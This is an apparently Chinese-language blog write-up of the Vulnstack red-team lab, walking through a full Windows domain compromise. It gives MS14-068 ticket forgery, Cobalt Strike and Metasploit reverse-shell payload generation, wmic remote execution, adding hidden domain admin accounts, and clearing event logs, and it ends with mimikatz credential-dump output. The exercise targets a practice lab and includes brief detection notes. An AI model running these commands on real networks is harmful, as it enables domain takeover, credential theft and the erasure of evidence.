+<p>在这里我使用<code>ms14-068</code>进行PsT攻击</p>
+<blockquote>
+<p>MS14-068是密钥分发中心（KDC）服务中的Windows漏洞。它允许经过身份验证的用户在其Kerberos票证（TGT）中插入任意PAC（表示所有用户权限的结构）。该漏洞位于kdcsvc.dll域控制器的密钥分发中心(KDC)中。用户可以通过呈现具有改变的PAC的Kerberos TGT来获得票证.</p>
+</blockquote>
+<p>1.得到普通域用户的sid</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /user</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">de1ay\administrator S-1-5-21-2756371121-2868759905-3853650604-500</span><br></pre></td></tr></table></figure>
+
+<p>2.Cobalt Strike socks 代理</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; socks 6666</span><br></pre></td></tr></table></figure>
+
+<p>3.编辑proxychains配置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/proxychains.conf</span><br><span class="line">socks 6666</span><br></pre></td></tr></table></figure>
+
+<p>4.kali 攻击机运行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ms14-068.py -u mssql@de1ay.com -s S-1-5-21-2756371121-2868759905-3853650604-500 -d 10.10.10.10 -p &apos;1qaz@WSX&apos;</span><br></pre></td></tr></table></figure>
+
+<p>5.使用 <a href="https://github.com/rvazarkar/KrbCredExport" target="_blank" rel="noopener">KrbCredExport</a>进行转换</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python KrbCredExport.py TGT_mssql@de1ay.com.ccache mssql.ticket</span><br></pre></td></tr></table></figure>
+
+<p>6.使用cobalt strike进行凭据注入</p>
+<p>清除凭证</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos_ticket_purge</span><br></pre></td></tr></table></figure>
+
+<p>7.使用kerberos_ticket_use进行凭据注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos_ticket_use de1ay.ticket</span><br></pre></td></tr></table></figure>
+
+<p>8.尝试访问域控资源</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\dc.de1ay.com\c$</span><br></pre></td></tr></table></figure>
+
+<h3 id="添加域控管理员"><a href="#添加域控管理员" class="headerlink" title="添加域控管理员"></a>添加域控管理员</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user hacker P@ssword /add /doamin</span><br><span class="line">net group &quot;Domain admins&quot; hacker /add /domain</span><br></pre></td></tr></table></figure>
+
+<p>这里一直添加不上，开始我以为是命令的问题，后面用CS中的<code>进程管理</code>发现本地存在360</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-15_14-06-08.png" alt></p>
+<p>这里尝试先登录web端(192.168.111.80 &lt;-&gt; 10.10.10.80)，但是3389没有开放</p>
+<p>所以在Cobalt Strike 下使用命令</p>
+<p>1.查看端口开放情况</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSconnections</span><br></pre></td></tr></table></figure>
+
+<p>若返回 0x1 表示<code>关闭</code>,0x0表示<code>开启</code></p>
+<p>2.通过查询注册表查看远程服务端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /f &quot;tokens=2 delims=x&quot; %a in (&apos;reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; ^| find &quot;PortNumber&quot;&apos;) do (set /a n=0x%a)</span><br></pre></td></tr></table></figure>
+
+<p>3.3389端口</p>
+<p>1)开启3389端口：</p>
+<p>在cmd内，执行如下命令，即可开启3389端口。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure>
+
+<p>2)关闭3389端口：</p>
+<p>在cmd内，执行如下命令，即可关闭3389端口。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f</span><br></pre></td></tr></table></figure>
+
+<p>3)也可以通过导入注册表来开启3389，本质一样。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"></span><br><span class="line">[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]</span><br><span class="line">&quot;fDenyTSConnections&quot;=dword:00000000</span><br><span class="line"></span><br><span class="line">[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]</span><br><span class="line">&quot;PortNumber&quot;=dword:00000d3d</span><br></pre></td></tr></table></figure>
+
+<p>保存为test.reg，然后执行 <code>regedit /s test.reg</code></p>
+<p>4.通过查看端口得知，开启成功</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell netstat -ano | findstr 3389</span><br></pre></td></tr></table></figure>
+
+<p>5.根据抓取的账号密码登陆web端（192.168.111.80）的3389关闭360</p>
+<p>6.添加域控管理员</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user hacker P@ssword /add /doamin</span><br><span class="line">net group &quot;Domain admins&quot; hacker /add /domain</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-15_15-06-52.png" alt></p>
+<p>7.添加后查看域控是否成功加入域控管理员</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user &quot;Domain Admins&quot; /domain</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-15_15-08-04.png" alt></p>
+<p>成功加入域控管理员</p>
+<h3 id="IPC连接"><a href="#IPC连接" class="headerlink" title="IPC连接"></a>IPC连接</h3><p>建立<code>IPC$</code>连接上传木马   建立后可以访问目标机器的文件(上传、下载)，也可以在目标机器上运行命令。上传和下载文件直接通过copy命令就可以，不过路径换成UNC路径。（这里需要用到刚才添加的<strong>域控管理员密码</strong>）</p>
+<p>常用命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net use \\ip\ipc$ pawword /user:username   建立IPC连接 </span><br><span class="line">copy hacker.exe \\10.10.10.10\C$\windows\temp 复制本地文件到目标服务器</span><br><span class="line">copy \\10.10.10.10\C$\windows\temp\hash.txt 复制目标服务器文件到本地</span><br></pre></td></tr></table></figure>
+
+<p><strong>这里使用的是msf来中转路由</strong></p>
+<p>1.meterpreter生成payload.exe</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter_reverse_tcp LHOST=10.10.10.80 LPORT=8888 -f exe &gt; /tmp/payload.exe</span><br></pre></td></tr></table></figure>
+
+<p>2.ipc连接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; copy C:\Wh0ale\paylaod.exe \\10.10.10.10\c$\windows\temp\paylaod.exe</span><br></pre></td></tr></table></figure>
+
+<p>3.meterpreter进行监听</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 10.10.10.80</span><br><span class="line">set lport 8888</span><br></pre></td></tr></table></figure>
+
+<p>4.在跳板机上通过wmic命令执行木马</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; wmic /node:10.10.10.10 /user:hacker /password:P@ssword process call create &quot;C:\Windows\Temp\paylaod.exe&quot;</span><br></pre></td></tr></table></figure>
+
+<p>这里参考的是klion表哥教程： <a href="https://klionsec.github.io/2016/09/24/ipc-reverse-shell/" target="_blank" rel="noopener">win内网中利用ipc弹shell 小记</a></p>
+<p>使用到通过mimikatz读取内存获取的账号密码，在DC域控上创建一个进程<code>&quot;c:\Windows\temp\paylaod.exe&quot;</code></p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-15_16-38-19.png" alt></p>
+<p>5.sessions</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-15_16-41-11.png" alt></p>
+<p><strong>使用Cobalt Strike中转路由</strong></p>
+<p><em>做一步作为拓展</em></p>
+<p>1.点击Listener 同meterpreter设置 <code>lport</code> ,<code>lhost</code></p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-15_17-27-37.png" alt></p>
+<p>2.生成木马，设置<code>listener</code>为刚才设置的<code>vulnstack_msf</code></p>
+<p>3.ipc连接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">beacib&gt; copy C:\Wh0ale\paylaod1.exe \\10.10.10.10\c$\windows\temp\paylaod1.exe</span><br></pre></td></tr></table></figure>
+
+<p>4.在跳板机上通过wmic命令执行木马</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; wmic /node:10.10.10.10 /user:hacker /password:P@ssword process call create &quot;C:\Windows\Temp\paylaod1.exe&quot;</span><br></pre></td></tr></table></figure>
+
+<p>5.成了，如果是在<code>dc.de1ay.com</code>双击木马是普通权限，通过cs的中转路由是administrator权限，<strong>此时我们拿到域控的管理员权限</strong></p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-15_17-32-38.png" alt></p>
+<blockquote>
+<p>这里不知道是我输入的问题，还是CS的问题，同样的命令我粘贴到beacon执行就无法执行成功，手打才可以</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-15_21-55-27.png" alt></p>
+<p><code>logonpasswords</code>已经读取到域控的明文密码了</p>
+<h3 id="MSF派生shell给Cobaltstrike"><a href="#MSF派生shell给Cobaltstrike" class="headerlink" title="MSF派生shell给Cobaltstrike"></a>MSF派生shell给Cobaltstrike</h3><p>获取MSF shell、建立session后在meterpreter执行<code>background</code>将会话放到后台，切换payload。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(handler) &gt;  use exploit/windows/local/payload_inject</span><br><span class="line">msf exploit(payload_inject) &gt; set PAYLOAD windows/meterpreter/reverse_http</span><br><span class="line">msf exploit(payload_inject) &gt; set DisablePayloadHandler true</span><br><span class="line">msf exploit(payload_inject) &gt; set LHOST [Listener监听IP]</span><br><span class="line">msf exploit(payload_inject) &gt; set LPORT [Listener监听端口]</span><br><span class="line">msf exploit(payload_inject) &gt; set SESSION [session ID]</span><br><span class="line">msf exploit(payload_inject) &gt; exploit</span><br></pre></td></tr></table></figure>
+
+<p>Cobalt Strike 监听和msf设置的相同端口。</p>
+<p>本来想把msf的shell弹回Cobalt Strike，一直没能成功</p>
+<h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><p>1.上传<code>Invoke-TokenManipulation.ps1</code>和<code>Windows-User-Clone.ps1</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">upload Invoke-TokenManipulation.ps1</span><br><span class="line">upload Windows-User-Clone.ps1</span><br></pre></td></tr></table></figure>
+
+<p>2.设置当前用户的执行 策略为<code>Unrestricted</code>，也算是去更改了当前的全局策略 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Get-ExecutionPolicy</span><br><span class="line">Set-ExecutionPolicy Unrestricted</span><br></pre></td></tr></table></figure>
+
+<p>3.<strong>3389登陆</strong>(我懒得3389连了，直接在虚拟机上运行了)</p>
+<p>Invoke-TokenManipulation.ps1用于打开一个System权限的进程</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module C:\Wh0ale\Invoke-TokenManipulation.ps1</span><br><span class="line">Invoke-TokenManipulation -CreateProcess &quot;cmd.exe&quot; -Username &quot;nt authority\system&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-16_11-54-35.png" alt></p>
+<p>4.运行Windows-User-Clone.ps1</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell Import-Module C:\Wh0ale\Windows-User-Clone.ps1</span><br><span class="line">Create-Clone -u abc -p abc123 -cu administrator</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-16_11-58-36.png" alt></p>
+<p>域有密码长度限制将ps文件的密码也修改下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Create-Clone -u abc -p P@ssword -cu administrator</span><br></pre></td></tr></table></figure>
+
+<p>5.查看是否添加成功</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-16_12-42-02.png" alt></p>
+<p>主要原理是</p>
+<p>Invoke-TokenManipulation.ps1 通过token复制获得system权限</p>
+<p>Windows-User-Clone.ps1 </p>
+<ul>
+<li>新建测试帐户</li>
+<li>将注册表导出到temp目录，进行替换</li>
+<li>删除特殊帐户</li>
+<li>导入注册表文件</li>
+</ul>
+<p><strong>防御</strong></p>
+<p>针对隐藏帐户的利用，查看注册表<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\</code>即可</p>
+<p>当然，默认管理员权限无法查看，需要分配权限或是提升至Sytem权限</p>
+<p>隐藏帐户的登录记录，可通过查看日志获取</p>
+<h2 id="痕迹清理"><a href="#痕迹清理" class="headerlink" title="痕迹清理"></a>痕迹清理</h2><p>获取日志分类列表：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wevtutil el &gt;1.txt</span><br></pre></td></tr></table></figure>
+
+<p>获取单个日志类别的统计信息：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wevtutil gli &quot;windows powershell&quot;</span><br></pre></td></tr></table></figure>
+
+<p>回显：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">creationTime: 2016-11-28T06:01:37.986Z</span><br><span class="line">lastAccessTime: 2016-11-28T06:01:37.986Z</span><br><span class="line">lastWriteTime: 2017-08-08T08:01:20.979Z</span><br><span class="line">fileSize: 1118208</span><br><span class="line">attributes: 32</span><br><span class="line">numberOfLogRecords: 1228</span><br><span class="line">oldestRecordNumber: 1</span><br></pre></td></tr></table></figure>
+
+<p>查看指定日志的具体内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wevtutil qe /f:text &quot;windows powershell&quot;</span><br></pre></td></tr></table></figure>
+
+<p>删除单个日志类别的所有信息：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wevtutil cl &quot;windows powershell&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>破坏Windows日志记录功能</strong> </p>
+<p>利用工具 </p>
+<ul>
+<li><a href="https://github.com/hlldz/Invoke-Phant0m" target="_blank" rel="noopener">Invoke-Phant0m</a> </li>
+<li><a href="https://github.com/3gstudent/Windwos-EventLog-Bypass" target="_blank" rel="noopener">Windwos-EventLog-Bypass</a> </li>
+</ul>
+<p><strong>msf</strong> </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run clearlogs</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clearev</span><br></pre></td></tr></table></figure>
+
+<p><strong>3389登陆记录清除</strong> </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">@reg delete &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default&quot; /va /f</span><br><span class="line">@del &quot;%USERPROFILE%\My Documents\Default.rdp&quot; /a</span><br><span class="line">@exit</span><br></pre></td></tr></table></figure>
+
+<p>以上就是Vulnstack整个渗透过程，在渗透过程没出现比较难的点，基本上就是环境搭建花费的事件比较长，在本地搭建的的对性能消耗很大，开三个虚拟机加一个文档编辑器就卡的不行了，下次考虑在公司服务器上搭建下。</p>
+<h1 id="todo"><a href="#todo" class="headerlink" title="todo"></a>todo</h1><p>域渗透过程中协议通信研究</p>
+<p>hackthebox域渗透</p>
+<p>根据特征写PRS防御横向移动规则</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/3/" target="_blank" rel="noopener">ATT&amp;CK红队评估实战靶场二</a></p>
+<p><a href="https://www.anquanke.com/post/id/193193" target="_blank" rel="noopener">从外网到域控（vulnstack靶机实战2）</a></p>
+<p><a href="https://uknowsec.cn/posts/notes/%E5%9F%9F%E6%B8%97%E9%80%8F-Relay.html" target="_blank" rel="noopener">域渗透-Relay</a></p>
+<p><a href="https://3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D/" target="_blank" rel="noopener">Windows下的密码hash-NTLM-hash和Net-NTLM-hash介绍</a></p>
+<p><a href="https://klionsec.github.io/2016/09/24/ipc-reverse-shell/" target="_blank" rel="noopener">win内网中利用ipc弹shell 小记</a></p>
+<p><a href="https://www.freebuf.com/articles/system/182531.html" target="_blank" rel="noopener">比CMD更强大的命令行：WMIC后渗透利用（系统命令）</a></p>
+<p><a href="https://ssooking.github.io/yu-shen-tou-zhi-ntml-hash/#2-Pass-The-Hash" target="_blank" rel="noopener">域渗透之NTML-Hash</a></p>
+<p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%B8%90%E6%88%B7%E9%9A%90%E8%97%8F/" target="_blank" rel="noopener">渗透技巧——Windows系统的帐户隐藏</a></p>
+<p><a href="https://github.com/Ridter/Pentest" target="_blank" rel="noopener">https://github.com/Ridter/Pentest</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  .#####.   mimikatz 2.2.0 (x64) #18362 Nov 25 2019 02:50:28</span><br><span class="line"> .## ^ ##.  &quot;A La Vie, A L&apos;Amour&quot; - (oe.eo)</span><br><span class="line"> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span><br><span class="line"> ## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span><br><span class="line"> &apos;## v ##&apos;       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  &apos;#####&apos;        &gt; http://pingcastle.com / http://mysmartlogon.com   ***/</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) # sekurlsa::minidump lsass.dmp</span><br><span class="line">Switch to MINIDUMP : &apos;lsass.dmp&apos;</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) # sekurlsa::logonPasswords full</span><br><span class="line">Opening : &apos;lsass.dmp&apos; file for minidump...</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 9591948 (00000000:00925c8c)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : DefaultAppPool</span><br><span class="line">Domain            : IIS APPPOOL</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2019/12/13 13:59:21</span><br><span class="line">SID               : S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415</span><br><span class="line">	msv :	</span><br><span class="line">	 [00000003] Primary</span><br><span class="line">	 * Username : WEB$</span><br><span class="line">	 * Domain   : DE1AY</span><br><span 